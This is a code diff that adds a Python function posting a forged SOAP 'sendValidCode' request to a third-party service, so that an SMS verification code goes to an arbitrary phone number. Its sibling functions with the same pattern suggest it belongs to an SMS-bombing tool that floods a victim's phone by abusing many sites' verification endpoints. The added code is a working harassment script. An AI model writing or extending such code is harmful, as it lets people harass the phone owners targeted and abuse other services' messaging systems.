@@ -60,6 +60,18 @@ def go189(phone_number):
     requests.get(url, params=payload, headers=ua)
 
 
+def tdx(phone_number):
+    payload = '<v:Envelope xmlns:i="http://www.w3.org/1999/XMLSchema-instance" xmlns:d="http://www.w3.org/1999/XMLSchema" xmlns:c="http://schemas.xmlsoap.org/soap/encoding/" xmlns:v="http://schemas.xmlsoap.org/soap/envelope/"><v:Header /><v:Body><n0:sendValidCode id="o0" c:root="1" xmlns:n0="http://service.webservice.magnetic.com/"><arg0 i:type="d:string">{}</arg0><params i:type="d:string">[]</params></n0:sendValidCode></v:Body></v:Envelope>'
+    url = 'http://www.16tdx.com/nctl/j_magnetic_ws'
+    headers = {
+        'User-Agent': 'kSOAP/2.0',
+        'SOAPAction': 'http://service.webservice.magnetic.com/sendValidCode',
+        'Content-Type': 'text/xml'
+    }
+
+    requests.post(url, data=payload.format(phone_number), headers=headers)
+
+
 def yuu1(phone_number):
     payload = {
         'username': phone_number,
